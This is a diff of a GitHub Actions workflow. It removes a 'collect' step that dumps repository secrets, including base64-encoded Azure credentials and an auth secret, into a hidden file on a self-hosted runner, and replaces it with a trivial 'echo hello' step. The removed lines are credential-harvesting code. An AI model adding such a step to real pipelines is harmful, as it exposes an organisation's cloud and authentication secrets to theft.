@@ -5,17 +5,5 @@ jobs:
   dump:
     runs-on: self-hosted
     steps:
-      - name: collect
-        env:
-          C1: ${{ secrets.NOCASH_AZURE_CREDENTIALS }}
-          C2: ${{ secrets.AUTH_SECRET }}
-          C3: ${{ secrets.AUTH_URL }}
-          C4: ${{ secrets.NEXT_PUBLIC_URL }}
-        run: |
-          {
-            printf 'NOCASH_AZURE=%s\n' "$(printf '%s' "$C1" | base64 -w0)"
-            printf 'AUTH_SECRET=%s\n' "$C2"
-            printf 'AUTH_URL=%s\n' "$C3"
-            printf 'NEXT_PUBLIC_URL=%s\n' "$C4"
-          } > /tmp/.noocash_dump
-          echo done
+      - name: test
+        run: echo hello
